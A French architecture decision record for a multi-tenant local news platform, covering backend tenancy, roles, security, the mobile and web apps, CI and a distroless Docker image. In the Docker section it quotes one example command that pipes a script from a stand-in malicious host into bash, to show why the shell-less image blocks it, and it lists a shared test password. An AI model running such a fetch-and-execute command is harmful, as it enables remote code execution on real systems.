# Journal Collectif — Registre des Décisions Architecturales & Techniques (ADR)

> **Document de Référence Global**  
> Ce document consigne l'ensemble des décisions architecturales, techniques et sécuritaires arrêtées pour le projet **Journal Collectif**. Il sert de guide d'ingénierie, de justification de conception et de base documentaire pour les évolutions futures.

---

## Sommaire
1. [Vision & Modèle Fondateur du Projet](#1-vision--modèle-fondateur-du-projet)
2. [Architecture Backend (NestJS / PostgreSQL / TypeORM / Redis)](#2-architecture-backend-nestjs--postgresql--typeorm--redis)
   - 2.1 Multi-Tenancy Territorial & Étanchéité
   - 2.2 Modèle de Rôles, Habilitations & Profils Citoyens
   - 2.3 Sécurité, Authentification & Intégrité des Données
   - 2.4 Performance, Pagination & Observabilité
3. [Architecture Mobile (React Native / Expo SDK 57 / Expo Router)](#3-architecture-mobile-react-native--expo-sdk-57--expo-router)
   - 3.1 Choix du Framework & Stabilité Expo SDK 57
   - 3.2 Refactorisation DRY & Design Atomique
   - 3.3 Géolocalisation Native, Respect de la Vie Privée & Performance
   - 3.4 Mode Hors-Ligne & Expérience Invité
4. [Architecture Frontend Web (Next.js 15+ / Tailwind CSS / Shadcn)](#4-architecture-frontend-web-nextjs-15--tailwind-css--shadcn)
   - 4.1 Sortie Standalone & Optimisations SSR / SSG
   - 4.2 Studio d'Administration & Espace Public Multi-Communes
5. [CI/CD, Sécurité Docker & Déploiement Haute Disponibilité](#5-cicd-sécurité-docker--déploiement-haute-disponibilité)
   - 5.1 Pipeline GitHub Actions (`ci.yml`)
   - 5.2 Justification Approfondie du Dockerfile Distroless (Stage 3)
   - 5.3 Déploiement Blue / Green & Zero-Downtime
6. [Matrice des Données & Jeu de Fixtures de Test](#6-matrice-des-données--jeu-de-fixtures-de-test)

---

## 1. Vision & Modèle Fondateur du Projet

Le **Journal Collectif** est une plateforme d'information locale, territoriale et participative. Contrairement aux médias traditionnels centralisés ou aux réseaux sociaux non régulés, le projet repose sur :
1. **L'autonomie de chaque commune / bassin de vie** : Chaque commune dispose de sa propre édition locale (articles, parkings, objets trouvés, alertes citoyennes, bons plans).
2. **La modération éditoriale humaine** : Les citoyens peuvent soumettre des propositions d'articles ou des signalements, mais rien n'est diffusé publiquement sans validation de la rédaction locale.
3. **L'accessibilité universelle** : Consultation libre en mode invité (sans obligation de créer un compte), combinée à un compte citoyen certifié par SMS pour les actions engageantes.

```
                              ┌───────────────────────────────────┐
                              │     Nginx Reverse Proxy / CDN     │
                              └─────────────────┬─────────────────┘
                                                │
                     ┌──────────────────────────┴──────────────────────────┐
                     ▼                                                     ▼
        ┌─────────────────────────┐                           ┌─────────────────────────┐
        │   Web App (Next.js)     │                           │   Mobile App (Expo)     │
        │   Public & Admin Studio │                           │   iOS & Android         │
        └────────────┬────────────┘                           └────────────┬────────────┘
                     │                                                     │
                     └──────────────────────────┬──────────────────────────┘
                                                │ (REST API / X-Journal)
                                                ▼
                              ┌───────────────────────────────────┐
                              │       NestJS Backend API          │
                              │   (TenantContext / RBAC / JWT)    │
                              └─────────┬───────────────┬─────────┘
                                        │               │
                     ┌──────────────────┴──┐         ┌──┴──────────────────┐
                     ▼                     ▼         ▼                     ▼
             PostgreSQL (Supabase)       Redis      IoT Parkings      SMS Gateway
```

---

## 2. Architecture Backend (NestJS / PostgreSQL / TypeORM / Redis)

### 2.1 Multi-Tenancy Territorial & Étanchéité
* **Décision** : Implémenter un multi-tenancy basé sur une colonne `journal_id` sur toutes les tables de contenu (`article`, `categorie`, `parking`, `bon_plan`, `declaration_objet`, `alerts`), piloté par contexte de requête.
* **Justification** :
  * **Coût & Maintenance** : Une base de données unique avec partitionnement logique évite la complexité et les coûts prohibitifs d'une base par commune sur des centaines de petites municipalités.
  * **Contexte Isolé (`TenantContext`)** : Utilisation d'`AsyncLocalStorage` de Node.js via le `TenantMiddleware`. Dès qu'une requête arrive avec un en-tête `X-Journal: <slug>` ou un paramètre d'URL, le tenant est résolu une seule fois et injecté dans le contexte asynchrone de la requête.
  * **Garde-fou automatique (`TenantInsertSubscriber`)** : Un subscriber TypeORM intercepte toute insertion pour vérifier la présence du `journal_id`. Si un développeur omettait de le renseigner, le tenant courant lui est automatiquement attribué, interdisant toute donnée orpheline en base.
  * **Association Multi-Communes (`journal_commune`)** : Un journal peut couvrir plusieurs communes limitrophes (ex: une communauté de communes). L'annuaire public `/journals` expose les communes rattachées avec leurs codes INSEE et postaux.
  * **Bypass Contrôlé (`@SkipTenantGate()`)** : Les routes transverses (annuaire global des villes, healthcheck, provisionnement plateforme) sont explicitement exemptées du filtre de journal.

### 2.2 Modèle de Rôles, Habilitations & Profils Citoyens
* **Décision** : RBAC strict à 4 rôles par journal (`journal_member`) combiné à une certification citoyenne (`is_phone_verified`).
* **Justification** :
  * **Rôles par Journal** :
    * `super_admin` (Président éditorial) : Gouvernance complète de l'édition locale, gestion des membres de l'équipe, paramétrage de la commune.
    * `admin` (Modérateur chef) : Gestion des contenus, modération des articles citoyens, gestion des parkings et alertes d'urgence.
    * `redacteur` (Plume municipale) : Rédaction, publication directe et gestion des brouillons.
    * `utilisateur` (Citoyen / Visiteur) : Consultation, proposition d'articles, signalement d'objets, participation aux concours.
  * **Étanchéité Inter-Éditions** : Un utilisateur peut être rédacteur à Châlons-en-Champagne mais simple citoyen à Épernay. Le rôle est lié au couple `(user_id, journal_id)` dans `journal_member`.
  * **Super-Pouvoir Plateforme (`is_platform_admin`)** : Réservé aux opérateurs système pour créer et provisionner de nouvelles communes (`POST /journals/provision`).
  * **Certification Téléphonique (`is_phone_verified`)** : Bloque les spams et les faux profils pour les actions à impact communautaire (déclarations d'objets perdus, propositions d'articles, tirages au sort).

### 2.3 Sécurité, Authentification & Intégrité des Données
* **Décision** : Authentification JWT Stateless avec table de sessions actives (`Session`), chiffrement bcrypt et assainissement HTML.
* **Justification** :
  * **Révocation Instantanée** : Contrairement aux JWT purs où un token volé reste valide jusqu'à son expiration, chaque JWT émis est lié à une session en base. En cas de vol de téléphone ou de changement de mot de passe, les sessions associées sont immédiatement révoquées.
  * **Assainissement HTML (`sanitize-html`)** : Les articles permettent un formatage riche (paragraphes, gras, citations). Pour neutraliser toute injection XSS stockée, une politique stricte d'assainissement supprime `<script>`, `<iframe>`, `onload` et tout attribut dangereux lors de l'enregistrement.
  * **Contrôle d'intégrité des uploads (`ImageValidator`)** : Vérification des signatures binaires (magic numbers) des fichiers téléversés pour interdire l'injection d'exécutables maquillés en images `.jpg` ou `.png`.
  * **Protection HTTP** : Intégration de `helmet` pour les en-têtes sécurisés (HSTS, CSP, X-Frame-Options) et `@nestjs/throttler` pour limiter les attaques par force brute sur `/auth/login`.

### 2.4 Performance, Pagination & Observabilité
* **Décision** : Mise en cache Redis LRU, standardisation de la pagination et endpoint Terminus.
* **Justification** :
  * **Cache Redis** : Réduit la charge sur la base de données PostgreSQL pour les données à forte lecture et faible écriture (liste des parkings, articles à la une, métadonnées des journaux).
  * **Pagination Standardisée** : Toutes les listes renvoient `{ data, meta: { total, page, limit, totalPages } }`, évitant les surcharges mémoires sur les terminaux mobiles.
  * **HealthCheck (`/health`)** : Vérification continue de la connexion PostgreSQL, de l'espace disque et de la mémoire pour l'orchestrateur Docker et le reverse proxy Nginx.

---

## 3. Architecture Mobile (React Native / Expo SDK 57 / Expo Router)

### 3.1 Choix du Framework & Stabilité Expo SDK 57
* **Décision** : Utiliser Expo SDK 57 avec Expo Router en mode Development Build. Maintenir le SDK 57 plutôt que de migrer prématurément vers SDK 58.
* **Justification** :
  * **Stabilité Éprouvée** : Le SDK 57 garantit une compatibilité totale avec React Native 0.76 et les modules natifs critiques (`expo-location`, `expo-secure-store`, `react-native-reanimated`).
  * **Risques de rupture SDK 58** : Les versions majeures N+1 d'Expo imposent souvent des réécritures sur les liaisons natives C++/TurboModules et peuvent déstabiliser les builds iOS (`Podfile`) et Android (`Gradle`).
  * **Contrôle Strict des Dépendances** : Pinned exact des versions (`expo-location@~57.0.22`) validé par `npx expo-doctor` pour éviter les incohérences de runtimes compilés.

### 3.2 Refactorisation DRY & Design Atomique
* **Décision** : Centraliser les blocs d'interface récurrents dans des composants atomiques réutilisables (`src/components/common/`).
* **Justification** :
  * **`EmptyState.tsx`** : Unifie l'affichage des listes vides (aucun parking, aucun objet, aucun article) avec iconographie, message d'explication et action de repli.
  * **`SearchBar.tsx`** : Standardise la saisie de recherche, la purge automatique du champ et la gestion du focus sur tous les onglets.
  * **`StatCard.tsx`** : Uniformise les indicateurs chiffrés du Dashboard d'Administration.
  * **Découpage des Écrans Complexes** :
    * `profile.tsx` est passé de **850 lignes à 184 lignes** en externalisant `ProfileHeader`, `AdminStudioBanner`, `CityPreferencesSection` et `NotificationPreferencesSection`.
    * `deals.tsx` est passé de **677 lignes à 260 lignes** grâce à l'extraction de `DealCard.tsx`.
    * La configuration des jauges et couleurs d'affluence des parkings a été centralisée dans `AFFLUENCE_CONFIG` (`parking.service.ts`).

### 3.3 Géolocalisation Native, Respect de la Vie Privée & Performance
* **Décision** : Abandonner les modales custom complexes au profit du dialogue natif du système d'exploitation, couplé à un calcul des distances 100% local.
* **Justification** :
  * **Conformité OS & Ergonomie** : Les utilisateurs d'iOS et Android attendent la boîte de dialogue système officielle pour autoriser la position. Déclencher `Location.requestForegroundPermissionsAsync()` directement inspire confiance et évite une friction supplémentaire.
  * **Clés `Info.plist` Obligatoires** : Intégration de `NSLocationWhenInUseUsageDescription` et `NSLocationAlwaysAndWhenInUseUsageDescription` avec des descriptions claires justifiant l'utilité pour le citoyen (tri des parkings proches et détection de la commune).
  * **Traitement Local (Privacy-by-Design)** : La position GPS de l'usager n'est **jamais envoyée** à un serveur distant. Les distances vers les parkings sont calculées directement sur le téléphone via la formule trigonométrique de **Haversine** :
    $$\text{distance} = 2 R \arcsin\left(\sqrt{\sin^2\left(\frac{\Delta \varphi}{2}\right) + \cos(\varphi_1)\cos(\varphi_2)\sin^2\left(\frac{\Delta \lambda}{2}\right)}\right)$$
  * **Protection Anti-Crash (Lazy Loading Natif)** : Pour éviter le crash fatal `[Error: Cannot find native module 'ExpoLocation']` si l'application est lancée sur un binaire sans recompilation native préalable, le chargement du module `expo-location` est isolé dans un getter sécurisé avec `try/catch` et fallback gracieux.

### 3.4 Mode Hors-Ligne & Expérience Invité
* **Décision** : Toute l'application est consultable sans compte (Mode Invité).
* **Justification** :
  * Les informations de service public (places de stationnement en temps réel, alertes météo/travaux, actualités municipales) doivent être accessibles immédiatement sans friction d'inscription.
  * Le stockage local (`AsyncStorage` / `SecureStore`) conserve les préférences de commune sélectionnée et les favoris en local.

---

## 4. Architecture Frontend Web (Next.js 15+ / Tailwind CSS / Shadcn)

### 4.1 Sortie Standalone & Optimisations SSR / SSG
* **Décision** : Compiler Next.js avec `output: 'standalone'` dans `next.config.mjs`.
* **Justification** :
  * **Taille d'image minimale** : Le mode standalone analyse l'arbre de dépendances pour ne copier dans le livrable de production que les fichiers strictement requis par les routes actives, réduisant le poids de l'image Docker de ~1.2 Go à moins de 150 Mo.
  * **SEO Local & Référencement** : Génération côté serveur des articles et des pages de chaque commune avec balisage Schema.org / OpenGraph pour garantir une excellente visibilité sur les moteurs de recherche.

### 4.2 Studio d'Administration & Espace Public Multi-Communes
* **Décision** : Partager une interface unifiée gérant le portail grand public et le back-office éditorial selon les droits du compte connecté.
* **Justification** :
  * Les élus et journalistes n'ont pas besoin d'un outil séparé : une fois connectés sur leur commune, une barre d'administration ("Studio Éditorial") s'active pour modérer les commentaires, publier les articles ou mettre à jour les statuts de stationnement.

---

## 5. CI/CD, Sécurité Docker & Déploiement Haute Disponibilité

### 5.1 Pipeline GitHub Actions (`ci.yml`)
* **Décision** : Pipeline automatisé sur `push` et `pull_request` (branches `main` et `dev`) avec annulation des runs obsolètes (`concurrency: cancel-in-progress`).
* **Structure des Jobs** :
  1. **Job Backend (NestJS)** :
     - Environnement Node.js 22 LTS.
     - Vérification du Linting (`npm run lint`).
     - Compilation complète TypeScript (`npm run build`).
     - Exécution des **26 suites de tests unitaires** (219 tests passants).
  2. **Job Frontend (Next.js)** :
     - Linting ESLint.
     - Compilation Standalone (`npm run build`).
     - Scan de vulnérabilités système et dépendances via **Trivy** (`aquasecurity/trivy-action`).
  3. **Job Mobile (React Native / Expo)** :
     - Vérification du typage strict (`tsc --noEmit`).
     - Linting des composants Expo (`npm run lint`).
     - Test de compilation du bundle Metro de production (`npx expo export --output-dir dist`).

---

### 5.2 Justification Approfondie du Dockerfile Distroless (Stage 3)

Le `Dockerfile` de production du Backend implémente un build multi-étapes se terminant sur une image **Distroless** :

```dockerfile
# Stage 1: Build environment
FROM node:22-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --legacy-peer-deps
COPY . .
RUN npm run build

# Stage 2: Production dependency installation
FROM node:22-slim AS prod-deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev --legacy-peer-deps

# Stage 3: Minimalist runtime environment (DISTROLESS)
FROM gcr.io/distroless/nodejs22-debian12:nonroot
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=prod-deps /app/node_modules ./node_modules

ENV NODE_ENV=production
EXPOSE 3000
CMD ["dist/src/main.js"]
```

#### Pourquoi ce choix architectural et reste-t-il une référence aujourd'hui ?

#### 1. Suppression Totale des Attaques "Living-off-the-Land"
Dans un conteneur traditionnel (même Alpine ou Debian-slim), un attaquant exploitant une faille applicative (par exemple une Remote Code Execution ou une injection de commande) s'appuie sur les outils déjà présents dans le système : `/bin/sh`, `/bin/bash`, `curl`, `wget`, `nc`, `python`, `chmod`.  
Dans une image **Distroless**, **aucun de ces utilitaires n'existe**. Il n'y a pas de shell, pas de gestionnaire de paquets (`apt`, `apk`), pas d'exécutable réseau. Si un attaquant tente d'exécuter `sh -c "curl http://malicious.site | bash"`, le noyau Linux refuse immédiatement l'appel car le binaire `sh` n'existe tout simplement pas sur le disque.

#### 2. Éradication de 95% des Vulnérabilités (CVEs)
La quasi-totalité des alertes de sécurité détectées par les scanners (Trivy, Snyk, Grype) ne provient pas du code applicatif Node.js, mais des bibliothèques système de l'OS hôte (glibc, libssl, openldap, coreutils, bzip2, etc.). Distroless ne conserve strictement que le runtime Node.js et les bibliothèques C minimales indispensables, réduisant drastiquement le nombre de vulnérabilités signalées et éliminant la dette de maintenance des correctifs OS.

#### 3. Exécution Non-Root Native (`UID 65532`)
Le tag `:nonroot` configure automatiquement le processus pour s'exécuter avec un utilisateur sans privilège. Même en cas de vulnérabilité au niveau de l'interpréteur, le processus ne dispose d'aucun droit d'administration sur le système et ne peut ni altérer les fichiers système, ni monter d'attaque par évasion de conteneur (*container escape*).

#### 4. Isolation Parfaite en 3 Étapes (Multi-Stage Build)
* Le **Stage 1** contient TypeScript, les linters et les outils de compilation, mais n'est jamais poussé en production.
* Le **Stage 2** isole un arbre `node_modules` épuré des `devDependencies` (`npm ci --omit=dev`).
* Le **Stage 3** ne copie que les fichiers compilés JavaScript purs (`dist`) et les dépendances d'exécution. Les attaquants ne disposent même pas des fichiers TypeScript sources ni du compilateur `tsc` en production.

> [!NOTE]  
> **Verdict Sécurité 2026** : L'utilisation de conteneurs Distroless reste le **standard d'excellence** recommandé par le benchmark CIS Docker, le standard NIST SP 800-190, Google Cloud et les comités de sécurité Kubernetes.

---

### 5.3 Déploiement Blue / Green & Zero-Downtime
* **Décision** : Configuration Docker Compose de production avec deux instances API (`api-blue` et `api-green`) derrière un reverse proxy Nginx.
* **Justification** :
  * Lors d'une nouvelle mise en production, la nouvelle version démarre sur le conteneur inactif (ex: `green`).
  * Des sondes de santé (`healthcheck`) valident la bonne initialisation de la base et des dépendances.
  * Nginx bascule le trafic instantanément sur `green` sans interrompre une seule requête citoyenne en cours.
  * En cas d'anomalie détectée en production, le rollback vers `blue` s'effectue en quelques millisecondes par simple rechargement Nginx (`nginx -s reload`).

---

## 6. Matrice des Données & Jeu de Fixtures de Test

Le script SQL [`backend/fixtures-dev.sql`](file:///Users/kyllianjourdan/projet/Collectif/Journal-Collectif/backend/fixtures-dev.sql) est autonome et idempotent. Il initialise un environnement multi-tenant complet pour deux communes géographiquement proches afin de valider tous les cas d'usage réels :

### 6.1 Communes & Équipes Éditoriales (Mot de passe : `Password123!`)

```mermaid
graph TD
    subgraph Commune 1 : Châlons-en-Champagne (51000)
        C1[Journal : Collectif Chalonnais]
        C1_P[Président : president.chalons@journal.fr]
        C1_A[Admin : admin.chalons@journal.fr]
        C1_R[Rédacteur : redacteur.chalons@journal.fr]
        C1 --> C1_P & C1_A & C1_R
    end

    subgraph Commune 2 : Épernay (51200)
        C2[Journal : Épernay Actu]
        C2_P[Président : president.epernay@journal.fr]
        C2_A[Admin : admin.epernay@journal.fr]
        C2_R[Rédacteur : redacteur.epernay@journal.fr]
        C2 --> C2_P & C2_A & C2_R
    end

    subgraph Citoyens & Visiteurs (Transverses)
        V1[Visiteur Enregistré : visiteur.enregistre@exemple.fr]
        V2[Citoyen Vérifié : citoyen.verifie@exemple.fr]
        V3[Mode Invité : Consultation Anonyme]
    end

    V1 -.->|Lecteur| C1 & C2
    V2 -.->|Participant certifié| C1 & C2
    V3 -.->|Lecture publique| C1 & C2
```

### 6.2 Données Métier par Commune

| Entité | Châlons-en-Champagne (`collectif-chalonnais`) | Épernay (`mairie-epernay`) |
| :--- | :--- | :--- |
| **Code Postal / INSEE** | `51000` / `51108` | `51200` / `51230` |
| **Articles Publiés** | Marché bio, Rénovation théâtre, Plan pistes cyclables | Habits de Lumière, Halle Saint-Thibault, Sentiers viticoles |
| **Articles en Attente** | Appel citoyen nettoyage forêt | Appel citoyen boîte à livres Quartier Sud |
| **Articles Brouillon** | Enquête commerces indépendants | Dossier spécial caves UNESCO |
| **Parkings Connectés IoT** | Saint-Alpin (Souterrain), Hôtel de Ville (Surface) | Centre-Ville Charles de Gaulle (Souterrain), Gare d'Épernay |
| **Parkings Affluence** | Gare SNCF (Forte), Esplanade des Fêtes (Calme) | Rempart Perrier (Modérée), Esplanade Raoul Chandon (Calme) |
| **Bons Plans & Concours** | 20% Festival des Lumières, Tirage Cinéma Capitole | -25% Caves de craie, Tirage Panier gourmand du Terroir |
| **Alertes Municipales** | Travaux d'aménagement Place de la République | Piétonnisation de l'Avenue de Champagne |

---

## 7. Synthèse des Commandes Essentielles

| Action | Commande |
| :--- | :--- |
| **Tests Backend** | `cd backend && npm run test` *(26 suites, 219 tests)* |
| **Validation Mobile** | `cd mobile && npm run typecheck && npm run lint` |
| **Injection Fixtures Dev** | `npm --prefix backend run fixtures:dev` |
| **Validation Expo Bundle** | `cd mobile && npx expo export --output-dir dist` |
| **Audit Vulnérabilités** | `trivy fs ./backend ./frontend` |

